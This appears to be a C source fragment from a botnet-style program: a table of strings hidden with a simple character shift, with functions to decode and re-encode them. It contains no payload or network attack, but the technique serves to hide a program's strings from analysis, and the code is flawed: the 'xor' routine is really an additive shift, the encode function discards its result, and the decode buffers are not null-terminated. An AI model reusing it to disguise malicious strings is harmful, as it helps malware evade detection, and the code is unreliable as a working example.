#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <string.h>
#include <fcntl.h>
#include <errno.h>
#include <dirent.h>

#include "table.h"

void xor_init(void)
{
	crypt_add_val(PROC, "jgnnq");
	crypt_add_val(EXEC_MSG, "nkuvgpkpi/vwp2");
}

void crypt_enc(char *string)
{
	int i;

	char enc_buf[100];

	for(i = 0; i < strlen(string) + 1; i++)
	{
		enc_buf[i] = string[i] + key;
	}

#ifdef DEBUG
	printf("[ENC] string: %s -> %s\n", string, enc_buf);
#endif
}

void crypt_add_val(int index, char *string)
{
	enc[index].status = 0;
	strcpy(enc[index].value, string);
}

void crypt_unlock_val(int index)
{
	int i;
	char dec_buf[100];

	if(enc[index].status == 0)
	{
		for(i = 0; i < strlen(enc[index].value); i++)
		{
			dec_buf[i] = enc[index].value[i] - key;
		}
	
		strcpy(enc[index].value, dec_buf);
		enc[index].status = 1;
	}
	else
	{
#ifdef DEBUG
		printf("[crypt-lock-val] table: %d is not locked\n", index);
#endif		
	}
}

void crypt_lock_val(int index)
{
	int i;
	char dec_buf[100];

	if(enc[index].status == 1)
	{
		for(i = 0; i < strlen(enc[index].value); i++)
			dec_buf[i] = enc[index].value[i] + key;
	
		strcpy(enc[index].value, dec_buf);
		enc[index].status = 0;
	}
	else
	{
#ifdef DEBUG
		printf("[crypt-lock-val] table: %d is not unlocked\n", index);
#endif
	}
}
